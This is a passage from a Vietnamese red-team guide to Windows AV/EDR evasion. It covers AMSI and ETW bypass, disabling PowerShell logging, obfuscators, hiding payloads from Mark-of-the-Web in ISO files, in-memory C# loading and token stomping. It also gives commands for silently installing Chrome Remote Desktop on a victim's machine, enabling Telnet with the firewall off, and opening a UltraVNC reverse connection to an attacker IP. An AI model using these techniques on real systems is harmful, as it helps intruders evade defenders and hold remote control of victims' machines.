- Đã thấy được sử dụng bởi các loader chạy thông qua LOLBins (ví dụ: `regsvr32` gọi `DllRegisterServer`).

Công cụ **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** cũng tạo script để bypass AMSI.
Công cụ **[https://amsibypass.com/](https://amsibypass.com/)** cũng tạo script để bypass AMSI, tránh signature bằng cách ngẫu nhiên hóa hàm do người dùng định nghĩa, biến, biểu thức ký tự và ngẫu nhiên hóa chữ hoa/chữ thường trong các từ khóa PowerShell.

**Xóa signature bị phát hiện**

Bạn có thể sử dụng các công cụ như **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** và **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** để xóa signature AMSI bị phát hiện khỏi bộ nhớ của tiến trình hiện tại. Công cụ này hoạt động bằng cách quét bộ nhớ của tiến trình hiện tại để tìm signature AMSI, sau đó ghi đè nó bằng các lệnh NOP, qua đó xóa nó khỏi bộ nhớ.

**Các sản phẩm AV/EDR sử dụng AMSI**

Bạn có thể tìm thấy danh sách các sản phẩm AV/EDR sử dụng AMSI tại **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Sử dụng PowerShell phiên bản 2**
Nếu sử dụng PowerShell phiên bản 2, AMSI sẽ không được tải, vì vậy bạn có thể chạy script mà không bị AMSI quét. Bạn có thể làm như sau:

```bash
powershell.exe -version 2
```

## Ghi nhật ký PS

Ghi nhật ký PowerShell là tính năng cho phép ghi lại tất cả lệnh PowerShell được thực thi trên hệ thống. Tính năng này hữu ích cho mục đích kiểm tra và khắc phục sự cố, nhưng cũng có thể là **vấn đề đối với attacker muốn tránh bị phát hiện**.

Để bypass ghi nhật ký PowerShell, bạn có thể dùng các kỹ thuật sau:

- **Vô hiệu hóa PowerShell Transcription và Module Logging**: Bạn có thể dùng công cụ như [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) cho mục đích này.
- **Dùng PowerShell phiên bản 2**: Nếu dùng PowerShell phiên bản 2, AMSI sẽ không được tải, vì vậy bạn có thể chạy script mà không bị AMSI quét. Bạn có thể thực hiện như sau: `powershell.exe -version 2`
- **Dùng phiên PowerShell không được quản lý**: Dùng [UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) để lưu trữ PowerShell mà không khởi chạy `powershell.exe` (cách tiếp cận được `powerpick` của Cobalt Strike sử dụng). Cách này tránh được các biện pháp kiểm soát gắn cụ thể với tiến trình `powershell.exe`, nhưng bản thân nó không vô hiệu hóa AMSI, Script Block Logging hay mọi biện pháp bảo vệ PowerShell khác; mức độ bao phủ phụ thuộc vào runtime và cách triển khai host.


## Obfuscation

> [!TIP]
> Một số kỹ thuật obfuscation dựa vào việc mã hóa dữ liệu, làm tăng entropy của binary và khiến AV, EDR dễ phát hiện hơn. Hãy cẩn thận; có thể chỉ mã hóa những phần cụ thể trong code nhạy cảm hoặc cần được ẩn đi.

### Gỡ obfuscation các binary .NET được ConfuserEx bảo vệ

Khi phân tích malware sử dụng ConfuserEx 2 (hoặc các bản fork thương mại), thường sẽ gặp nhiều lớp bảo vệ ngăn cản decompiler và sandbox. Quy trình dưới đây có thể **khôi phục IL gần như nguyên bản**, sau đó có thể decompile sang C# bằng các công cụ như dnSpy hoặc ILSpy.<sup>[[10]](#references)</sup>

1.  Gỡ anti-tampering – ConfuserEx mã hóa mọi *method body* và giải mã chúng bên trong static constructor của *module* (`<Module>.cctor`). Nó cũng vá PE checksum, khiến binary bị crash khi có bất kỳ sửa đổi nào. Dùng **AntiTamperKiller** để xác định các bảng metadata đã mã hóa, khôi phục các khóa XOR và ghi lại assembly sạch:
   ```bash
   # https://github.com/wwh1004/AntiTamperKiller
   python AntiTamperKiller.py Confused.exe Confused.clean.exe
   ```
   Output chứa 6 tham số anti-tamper (`key0-key3`, `nameHash`, `internKey`) có thể hữu ích khi xây dựng unpacker của riêng bạn.

2.  Khôi phục symbol / control-flow – đưa file *sạch* vào **de4dot-cex** (một fork của de4dot có hỗ trợ ConfuserEx).
   ```bash
   de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
   ```
   Các cờ:
     • `-p crx` – chọn profile ConfuserEx 2
     • de4dot sẽ hoàn tác control-flow flattening, khôi phục namespace, class và tên biến ban đầu, đồng thời giải mã các chuỗi hằng.

3.  Loại bỏ proxy-call – ConfuserEx thay thế các lời gọi method trực tiếp bằng các wrapper nhẹ (còn gọi là *proxy call*) để tiếp tục gây khó khăn cho quá trình decompile.  Xóa chúng bằng **ProxyCall-Remover**:
   ```bash
   ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
   ```
   Sau bước này, bạn sẽ thấy các API .NET thông thường như `Convert.FromBase64String` hoặc `AES.Create()` thay vì các hàm wrapper khó hiểu (`Class8.smethod_10`, …).

4.  Dọn dẹp thủ công – chạy binary thu được trong dnSpy, tìm các blob Base64 lớn hoặc việc sử dụng `RijndaelManaged`/`TripleDESCryptoServiceProvider` để xác định payload *thực*. Malware thường lưu payload dưới dạng mảng byte được mã hóa TLV và khởi tạo bên trong `<Module>.byte_0`.

Chuỗi bước trên khôi phục luồng thực thi **mà không cần chạy mẫu độc hại** – hữu ích khi làm việc trên máy trạm ngoại tuyến.

> 🛈  ConfuserEx tạo một custom attribute có tên `ConfusedByAttribute`, có thể dùng làm IOC để tự động phân loại sơ bộ các mẫu.

#### Lệnh một dòng
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```

---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: Công cụ làm rối mã C#**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Mục tiêu của dự án này là cung cấp một nhánh rẽ mã nguồn mở của bộ biên dịch [LLVM](http://www.llvm.org/), có khả năng tăng cường bảo mật phần mềm thông qua [làm rối mã](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) và chống giả mạo.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator minh họa cách sử dụng ngôn ngữ `C++11/14` để tạo mã đã làm rối tại thời điểm biên dịch mà không cần công cụ bên ngoài hay sửa đổi trình biên dịch.
- [**obfy**](https://github.com/fritzone/obfy): Thêm một lớp các thao tác đã làm rối, được tạo bằng framework lập trình siêu hình mẫu C++, khiến việc bẻ khóa ứng dụng khó hơn đôi chút.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz là công cụ làm rối binary x64, có thể làm rối nhiều loại tệp PE khác nhau, bao gồm: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame là engine mã metamorphic đơn giản dành cho các executable tùy ý.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator là framework làm rối mã chi tiết cho các ngôn ngữ được LLVM hỗ trợ, sử dụng ROP (lập trình hướng trả về). ROPfuscator làm rối chương trình ở cấp mã assembly bằng cách chuyển các lệnh thông thường thành chuỗi ROP, phá vỡ cách chúng ta hình dung tự nhiên về luồng điều khiển thông thường.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt là PE Crypter .NET được viết bằng Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor có thể chuyển EXE/DLL hiện có thành shellcode rồi tải chúng

### Tự che giấu từng hàm có hỗ trợ từ trình biên dịch LLVM

Thay vì chỉ che giấu toàn bộ implant khi nó ngủ, một backend LLVM X86 đã chỉnh sửa có thể giữ các hàm được chọn ở trạng thái XOR-masked bất cứ khi nào chúng không hoạt động. PoC Function Peekaboo chọn các tên đã giải mã chứa `REG_`, chèn các stub vào/ra độc lập vị trí quanh mã máy cuối cùng, và tạo một masking handler dùng chung trong `.text`; chữ ký ở cấp mã nguồn và quy ước gọi Windows x64 vẫn không đổi.<sup>[[38]](#references)[[39]](#references)</sup>

#### Chuyển đổi luồng điều khiển ở backend

Việc này nên diễn ra sau bước chọn lệnh và tối ưu hóa, vì quá trình chuyển đổi phải bao phủ **mọi lệnh return được phát ra** và biết chính xác bố cục x86. Một `MachineFunctionPass` trước bước phát mã tìm `MachineInstr::isReturn()` cuối cùng, xóa lệnh đó để đường đi cuối cùng rơi xuống epilogue được nối thêm, rồi thay các lệnh return trước đó bằng `JMP_1 handler`. Giữ nguyên mọi thao tác tháo stack/frame do trình biên dịch tạo ra trước mỗi lệnh return; chỉ chuyển hướng chính lệnh return đó.<sup>[[38]](#references)[[39]](#references)</sup>

`X86AsmPrinter::emitFunctionBodyStart()` và `emitFunctionBodyEnd()` phát các stub cho từng hàm, còn `emitEndOfAsmFile()` phát handler. Các symbol được chia sẻ giữa các giai đoạn phát mã cho phép nhánh trong prologue nhắm đến epilogue được phát sau đó; với lệnh `je` gần được phát thủ công, hãy ghi `0F 84` theo sau là biểu thức MC bốn byte `target - address_after_je`. Thay vào đó, có thể phát các lệnh gọi và nhảy đến handler dưới dạng đối tượng `MCInst` (`CALL64pcrel32` và `JMP_1`). Pass phải trả về `false` nếu hàm không được chọn và không có gì thay đổi; PoC trả về `true` sai trong trường hợp đó.<sup>[[38]](#references)[[39]](#references)</sup>

#### Metadata và khởi tạo trước CRT

PoC đặt một khóa XOR và các bản ghi 16 byte chứa con trỏ hàm được loader tái định vị cùng độ dài khi chạy trong `.funcmeta`. Dù trường C là `uint32_t`, handler truy cập một QWORD tại offset `+8` của bản ghi, chiếm cả độ dài lẫn phần đệm, rồi tăng con trỏ bản ghi thêm `0x10`. Tên section PE chỉ có tối đa tám byte, nên khi tra cứu lúc chạy, tên section là `.funcmet`. Một patcher bên ngoài thêm section thực thi `.stub`, lưu RVA entry point cũ trong stub và chuyển hướng `AddressOfEntryPoint`; PIC stub lấy image base từ `gs:[0x60]` → `[PEB+0x10]`, duyệt các import PE32+ để phân giải `VirtualProtect` đã được import sẵn, rồi chạy trước CRT.<sup>[[38]](#references)[[39]](#references)</sup>

Quá trình khởi tạo đặt một sentinel trong `gs:[0xE8]` và gọi mọi hàm trong metadata. Prologue luôn ở trạng thái có thể đọc sẽ ghi điểm bắt đầu của hàm vào `gs:[0xF0]`, phát hiện sentinel và bỏ qua phần thân vẫn còn chưa được mã hóa. Sau đó, epilogue dùng `call handler`; khi handler lưu 13 thanh ghi (`0x68` byte), địa chỉ trả về tại `[rsp+0x68]` là điểm cuối của hàm đã chuyển đổi, vì vậy có thể ghi `end - start` vào bản ghi metadata của hàm. Stub xóa sentinel và nhảy đến `ImageBase + original_entry_point_RVA` sau khi tất cả phần thân đã được mã hóa.<sup>[[38]](#references)[[39]](#references)</sup>

Trong một lời gọi thông thường, prologue gọi cùng handler đối xứng để giải mã phần thân. Đường đi cuối cùng rơi xuống epilogue được nối thêm, còn mọi lệnh return trước đó đều nhảy thẳng đến handler dùng chung. Epilogue thông thường cũng dùng `jmp handler` thay vì `call`, vì vậy sau khi mã hóa lại, lệnh `ret` của handler lấy địa chỉ trả về ban đầu của caller và giữ nguyên giá trị trả về của hàm trong `RAX`.<sup>[[38]](#references)[[39]](#references)</sup>

#### Cơ chế masking và dấu hiệu phân tích

Handler tìm bản ghi hiện tại, bỏ qua prologue cố định có thể đọc được (`0x46` byte trong bản dựng này), đổi quyền phần còn lại thành `PAGE_EXECUTE_READWRITE`, XOR từng byte với byte thấp của khóa, rồi đặt lại thành `PAGE_EXECUTE_READ`. Do đó, cùng một vòng lặp sẽ giải mã khi vào hàm và mã hóa khi thoát hàm thông thường.<sup>[[38]](#references)[[39]](#references)</sup>

Các dấu hiệu có giá trị cao của thiết kế này gồm:<sup>[[38]](#references)[[39]](#references)</sup>

- entry point nằm trong `.stub` có quyền thực thi và section `.funcmet` chứa khóa cùng các con trỏ `.text` đã được tái định vị;
- phân tích PEB, bảng import và bảng section trước CRT, sau đó gọi thông qua từng con trỏ metadata;
- các prologue PIC `call`/`pop` giống hệt nhau và nhiều điểm return được chuyển hướng đến một handler duy nhất;
- ghi vào `gs:[0xE8]`, `gs:[0xF0]` và `gs:[0xF8]`, tiếp theo là các lần chuyển quyền lặp lại bằng `VirtualProtect` và các thao tác XOR từng byte ghi vào những trang thực thi được backing bởi image.

Đây là cách né memory scanner, không phải biện pháp bảo vệ bằng mật mã: tệp đã được patch vẫn chứa phần thân gốc ở dạng rõ, và debugger có thể đặt breakpoint tại `VirtualProtect` hoặc vòng lặp XOR rồi dump hàm đang hoạt động. XOR một byte, metadata có thể đọc được và ranh giới cố định `0x46` cũng khiến việc khôi phục ngoại tuyến trở nên dễ dàng.<sup>[[38]](#references)[[39]](#references)</sup>

> [!WARNING]
> Các slot TEB của PoC là riêng theo thread, nhưng các trang mã đã sửa đổi áp dụng trên toàn process. Vì vậy, việc vào hàm đồng thời hoặc đệ quy có thể khiến các lệnh bị chuyển trạng thái qua lại khi một lời gọi khác vẫn đang thực thi; exception và các lối thoát không cục bộ cũng có thể bỏ qua bước mã hóa lại. Một triển khai vững chắc phải đồng bộ hóa các lần chuyển trạng thái, khôi phục quyền bảo vệ thực tế được trả về qua `lpflOldProtect`, tránh hard-code độ dài stub, kiểm tra cả đường đi `call` lẫn `jmp` để bảo đảm căn chỉnh stack x64, và gọi `FlushInstructionCache` sau khi ghi lại các byte thực thi. Microsoft nêu rõ caller chịu trách nhiệm bảo đảm tính nhất quán của instruction cache khi mã thực thi bị sửa đổi.<sup>[[38]](#references)[[39]](#references)[[40]](#references)</sup>

## SmartScreen & MoTW

Có thể bạn đã thấy màn hình này khi tải một số executable từ Internet và chạy chúng.

Microsoft Defender SmartScreen là cơ chế bảo mật nhằm bảo vệ người dùng cuối khỏi việc chạy các ứng dụng có khả năng độc hại.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen chủ yếu hoạt động dựa trên uy tín, nghĩa là các ứng dụng ít được tải xuống sẽ kích hoạt SmartScreen, cảnh báo và ngăn người dùng cuối chạy tệp (dù vẫn có thể chạy tệp bằng cách nhấp vào More Info -> Run anyway).

**MoTW** (Mark of The Web) là một [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) có tên Zone.Identifier, được tự động tạo khi tải tệp từ Internet, cùng với URL nơi tệp được tải xuống.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Kiểm tra Zone.Identifier ADS của một tệp được tải xuống từ Internet.</p></figcaption></figure>

> [!TIP]
> Lưu ý rằng các executable được ký bằng chứng chỉ ký **đáng tin cậy** sẽ **không kích hoạt SmartScreen**.

Một cách rất hiệu quả để ngăn payload của bạn bị gắn Mark of The Web là đóng gói chúng bên trong một dạng container như ISO. Điều này là do Mark-of-the-Web (MOTW) **không thể** được áp dụng lên các volume **không phải NTFS**.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) là công cụ đóng gói payload vào các container đầu ra để né Mark-of-the-Web.

Ví dụ sử dụng:

```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
    +             o     +           +             o     +         +
    o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
   :: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
   for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
    o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
    Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```

Đây là bản demo bypass SmartScreen bằng cách đóng gói payload bên trong các file ISO bằng [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) là một cơ chế ghi log mạnh mẽ trong Windows, cho phép các ứng dụng và thành phần hệ thống **ghi log sự kiện**. Tuy nhiên, các sản phẩm bảo mật cũng có thể sử dụng cơ chế này để theo dõi và phát hiện hoạt động độc hại.

Tương tự như cách AMSI bị vô hiệu hóa (bypass), ta cũng có thể khiến hàm **`EtwEventWrite`** của tiến trình user space trả về ngay lập tức mà không ghi log sự kiện nào. Việc này được thực hiện bằng cách patch hàm trong bộ nhớ để hàm trả về ngay, qua đó vô hiệu hóa ghi log ETW cho tiến trình đó.

Bạn có thể tìm thêm thông tin tại **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) và [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.<sup>[[33]](#references)[[34]](#references)</sup>


## Reflection Assembly C#

Việc load các binary C# vào bộ nhớ đã được biết đến từ lâu và vẫn là một cách rất hiệu quả để chạy các công cụ post-exploitation mà không bị AV phát hiện.

Vì payload sẽ được load trực tiếp vào bộ nhớ mà không ghi vào ổ đĩa, ta chỉ cần lo việc patch AMSI cho toàn bộ tiến trình.

Hầu hết các framework C2 (sliver, Covenant, metasploit, CobaltStrike, Havoc, v.v.) đã hỗ trợ thực thi trực tiếp các C# assembly trong bộ nhớ, nhưng có nhiều cách khác nhau để thực hiện:

- **Fork\&Run**

Phương pháp này bao gồm **tạo một tiến trình hy sinh mới**, inject mã độc post-exploitation của bạn vào tiến trình đó, thực thi mã độc rồi kết thúc tiến trình mới khi hoàn tất. Cách này có cả ưu điểm lẫn nhược điểm. Ưu điểm của phương pháp fork and run là việc thực thi diễn ra **bên ngoài** tiến trình Beacon implant của chúng ta. Điều này có nghĩa là nếu có sự cố trong quá trình post-exploitation hoặc bị phát hiện, **khả năng implant của chúng ta vẫn tồn tại sẽ cao hơn nhiều**. Nhược điểm là **khả năng bị phát hiện** bởi **Behavioral Detections** sẽ cao hơn.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Phương pháp này inject mã độc post-exploitation **vào chính tiến trình của nó**. Nhờ vậy, bạn có thể tránh phải tạo một tiến trình mới và để AV quét tiến trình đó, nhưng nhược điểm là nếu có sự cố khi thực thi payload, **khả năng beacon của bạn bị mất sẽ cao hơn nhiều** do tiến trình có thể bị crash.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Nếu muốn tìm hiểu thêm về việc load C# Assembly, hãy xem bài viết này [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) và BOF InlineExecute-Assembly của họ ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Bạn cũng có thể load C# Assembly **từ PowerShell**; hãy xem [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) và [video của S3cur3th1sSh1t](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Đóng gói lại các công cụ .NET thành WebAssembly bằng NativeAOT (WasmForge)

Các kỹ thuật `execute-assembly` thông thường vẫn giữ lại MSIL dễ nhận diện và cuối cùng khởi tạo CLR. **WasmForge** thay đổi nền tảng thực thi: nó chuyển một dự án C# sang target WASI NativeAOT-LLVM thử nghiệm, biên dịch trước thành WebAssembly và nhúng module đó vào một Windows PE host dựa trên Wazero. Tiến trình tạo ra không cần CLR, JIT hay `dotnet` host trên máy mục tiêu, do đó các quy tắc chỉ dựa vào tên managed assembly, việc load CLR, AMSI hoặc .NET ETW sẽ không còn khả năng quan sát trực tiếp. Đây là kỹ thuật né tránh/đóng gói, không phải bypass ranh giới đặc quyền—guest vẫn giữ nguyên quyền của công cụ ban đầu và các hành vi OS có thể quan sát được.<sup>[[44]](#references)[[45]](#references)</sup>

### Build một dự án C#

Đường dẫn build được khuyến nghị là môi trường Docker của dự án vì nó bao gồm .NET 10 SDK, NativeAOT-LLVM workload, WASI SDK 24.0, linker và các dependency để ký. File `.csproj` sẽ được tự động phát hiện; quy trình build một lần sẽ thực hiện migration, vá tính tương thích, biên dịch WASM, tạo PE và ký.<sup>[[45]](#references)</sup>

```bash
# From the WasmForge repository
make docker-build
make docker-run DOCKER_SRC=/path/to/Seatbelt DOCKER_PROJECT=seatbelt

# Equivalent direct build when all prerequisites are installed
GOOS=windows GOARCH=amd64 ./wasmforge build --win32-apis \
  -o seatbelt.exe /path/to/Seatbelt/Seatbelt/
```

For troubleshooting or reviewing generated code, split the process into `wasmforge dotnet-migrate <dir>`, `wasmforge dotnet-patch <dir>`, `dotnet publish -c Release -r wasi-wasm`, and a final `wasmforge build --wasm <module> --nativeaot --win32-apis -o <output.exe>`. Image build cũng sử dụng wrapper `wasm-component-ld` để tránh mã hóa component WASI Preview 2 và tạo ra module thuần mà runtime nhúng mong đợi.<sup>[[44]](#references)[[45]](#references)</sup>

### Bridging wasm32 C# to x64 Win32

Đây không phải là biên dịch lại mà vẫn giữ nguyên hành vi. NativeAOT-WASI thiếu hoặc thay đổi các tính năng BCL hướng đến Windows, còn guest wasm32 thường cấp phát các ô con trỏ bốn byte trong khi API x64 có thể trả về con trỏ tám byte. WasmForge xử lý cả hai vấn đề bằng các lớp được tạo sau:<sup>[[44]](#references)</sup>

1. Một công cụ vá mã nguồn khắc phục các khác biệt ngữ nghĩa đặc thù của AOT và chuyển hướng những lệnh gọi không được hỗ trợ liên quan đến registry, pipes, WMI, identity, directory-service, file-version, LSA và các lệnh gọi tương tự sang các helper `Wf*`.
2. Một trình quét P/Invoke tạo các ánh xạ NativeAOT `DirectPInvoke` để những lệnh gọi `[DllImport]` liên kết với các symbol C bridge đã liên kết, thay vì tải động DLL được khai báo bên trong guest.
3. Con trỏ liên kết với host sử dụng `ulong` trong C# và `uint64_t` trong C. Một dispatcher tổng quát chuyển tiếp lệnh gọi đến trình xử lý Win32 của host; `out8_mask` đánh dấu các ô đầu ra tám byte thực sự cần giữ lại phần trên. Với các đầu ra không được đánh dấu có cấu trúc wasm32, cơ chế snapshot/restore bảo vệ để thao tác ghi của x64 không làm hỏng bốn byte liền kề.
4. Các host bridge chuyên dụng xử lý những thao tác không phù hợp với cơ chế dispatch syscall tổng quát, chẳng hạn như truy cập ticket cache của LSA, các thao tác Kerberos/BCrypt có kết quả có cấu trúc, lưu lượng TCP KDC và truy vấn LDAP.

Ví dụ, một wrapper cho `version.dll!VerQueryValueW` truyền bốn địa chỉ host và đặt các bit 2 và 3 (`0xC`) vì con trỏ giá trị và độ dài là các ô đầu ra tám byte. Bản thân wrapper vẫn mang tính tổng quát và chuyển tên DLL, tên export, các tham số và mask đến `wf_call_v2`; host thực hiện chuyển đổi con trỏ và gọi API gốc.<sup>[[44]](#references)</sup>

```c
uint32_t version_VerQueryValueW_v2(uint64_t block, uint64_t subblock,
    uint64_t value_out, uint64_t length_out) {
    return (uint32_t)wf_call_v2("version.dll", "VerQueryValueW", 4,
        0xC, block, subblock, value_out, length_out);
}
```

### Hạn chế và các điểm chuyển hướng phát hiện

Mã sử dụng nhiều reflection, tải assembly động, callback native tùy ý và các cấu trúc x64 phức tạp được trả về bộ nhớ WASM vẫn có thể cần bản vá riêng cho từng công cụ hoặc không chạy được. Các socket WASI Preview 2 chung cũng có thể gọi đến các stub no-op, vì vậy các công cụ được hỗ trợ sử dụng host shim riêng theo từng giao thức. Hãy kiểm tra từng lệnh bằng bản dựng native thay vì mặc định rằng các tính năng tương đương nhau.<sup>[[44]](#references)[[45]](#references)</sup>

Kỹ thuật này chuyển hướng telemetry chứ không khiến payload trở nên vô hình. Có thể chuyển hướng phát hiện sang PE chứa hoặc tạo ra một module WASM, hành vi runtime tương tự Wazero, hoạt động cấp phát và sao chép bộ nhớ host/guest bất thường, điều phối Win32 trực tiếp chung, bất thường về chữ ký và tài nguyên PE, cùng các lệnh gọi API và lưu lượng mạng phát sinh. Do đó, không nên xem việc không có sự kiện CLR-load, AMSI hoặc .NET ETW là bằng chứng cho thấy tiến trình lành tính.<sup>[[44]](#references)</sup>

## Sử dụng các ngôn ngữ lập trình khác

Như được đề xuất trong [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), có thể thực thi mã độc bằng các ngôn ngữ khác bằng cách cấp cho máy đã bị xâm nhập quyền truy cập **vào môi trường interpreter được cài đặt trên SMB share do Attacker kiểm soát**.

Bằng cách cho phép truy cập vào các Interpreter Binary và môi trường trên SMB share, bạn có thể **thực thi mã tùy ý bằng các ngôn ngữ này trong bộ nhớ** của máy đã bị xâm nhập.

Repo cho biết: Defender vẫn quét các script, nhưng bằng cách sử dụng Go, Java, PHP, v.v., chúng ta có **nhiều linh hoạt hơn để bypass chữ ký tĩnh**. Thử nghiệm với các script reverse shell ngẫu nhiên, không được obfuscate, bằng những ngôn ngữ này đã cho kết quả thành công.

## WebAssembly re-hosting để né tránh static analysis

<a id="bridging-linear-memory-to-native-apis"></a>
<a id="per-build-wasm-vm-polymorphism"></a>
<a id="camouflaging-the-outer-go-executable"></a>

{{#ref}}
virtualized-payload-execution.md#webassembly-re-hosting-for-static-analysis-evasion
{{#endref}}

## TokenStomping

Token stomping thao túng access token của một sản phẩm bảo mật như EDR hoặc AV. Giảm quyền của token có thể khiến tiến trình tiếp tục chạy nhưng không thể thực hiện các hành động kiểm tra hoặc khắc phục cần quyền cao.

Để ngăn chặn việc này, Windows có thể **ngăn các tiến trình bên ngoài** lấy handle tới token của các tiến trình bảo mật.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Sử dụng phần mềm đáng tin cậy

### Chrome Remote Desktop

Như được mô tả trong [**bài blog này**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), bạn có thể dễ dàng triển khai Chrome Remote Desktop trên PC của nạn nhân, sau đó dùng nó để chiếm quyền điều khiển và duy trì persistence:<sup>[[35]](#references)</sup>
1. Tải xuống từ https://remotedesktop.google.com/, nhấp vào "Set up via SSH", rồi nhấp vào tệp MSI dành cho Windows để tải tệp MSI xuống.
2. Chạy trình cài đặt ở chế độ im lặng trên máy nạn nhân (cần quyền admin): `msiexec /i chromeremotedesktophost.msi /qn`
3. Quay lại trang Chrome Remote Desktop và nhấp vào next. Trình hướng dẫn sẽ yêu cầu bạn cấp quyền; nhấp vào nút Authorize để tiếp tục.
4. Thực thi lệnh được cung cấp với các điều chỉnh cần thiết: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (tham số `--pin` đặt PIN mà không cần dùng GUI).
 

## Advanced Evasion

{{#ref}}
virtualized-payload-execution.md
{{#endref}}

Evasion là một chủ đề rất phức tạp; đôi khi bạn phải tính đến nhiều nguồn telemetry khác nhau chỉ trong một hệ thống, vì vậy gần như không thể hoàn toàn tránh bị phát hiện trong các môi trường trưởng thành.

Mỗi môi trường bạn nhắm đến đều có ưu và nhược điểm riêng.

Tôi rất khuyến khích bạn xem bài nói chuyện này của [@ATTL4S](https://twitter.com/DaniLJ94) để có bước khởi đầu với các kỹ thuật Advanced Evasion.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Đây cũng là một bài nói chuyện tuyệt vời khác của [@mariuszbit](https://twitter.com/mariuszbit) về Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Kỹ thuật cũ**

### **Kiểm tra những phần nào bị Defender phát hiện là độc hại**

Bạn có thể dùng [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck), công cụ này sẽ **loại bỏ từng phần của binary** cho đến khi **xác định phần nào bị Defender** phát hiện là độc hại rồi tách phần đó ra cho bạn.\
Một công cụ khác làm **điều tương tự là** [**avred**](https://github.com/dobin/avred), với dịch vụ web mở tại [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Máy chủ Telnet**

Cho đến Windows10, mọi phiên bản Windows đều có **máy chủ Telnet** mà bạn có thể cài đặt (với quyền administrator) bằng cách:

```bash
pkgmgr /iu:"TelnetServer" /quiet
```

Hãy thiết lập để nó **khởi động** khi hệ thống khởi động và **chạy** nó ngay:

```bash
sc config TlntSVR start= auto obj= localsystem
```

**Đổi cổng telnet** (stealth) và tắt firewall:

```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```

### UltraVNC

Tải xuống từ: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (bạn cần bản tải xuống bin, không phải bản setup)

**TRÊN HOST**: Chạy _**winvnc.exe**_ và cấu hình server:

- Bật tùy chọn _Disable TrayIcon_
- Đặt mật khẩu trong _VNC Password_
- Đặt mật khẩu trong _View-Only Password_

Sau đó, chuyển binary _**winvnc.exe**_ và file _**UltraVNC.ini**_ mới được tạo vào **victim**

#### **Reverse connection**

**Attacker** cần **chạy bên trong** **host** của mình binary `vncviewer.exe -listen 5900` để sẵn sàng nhận **VNC connection** ngược. Sau đó, trên **victim**: Khởi chạy daemon winvnc bằng `winvnc.exe -run` rồi chạy `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

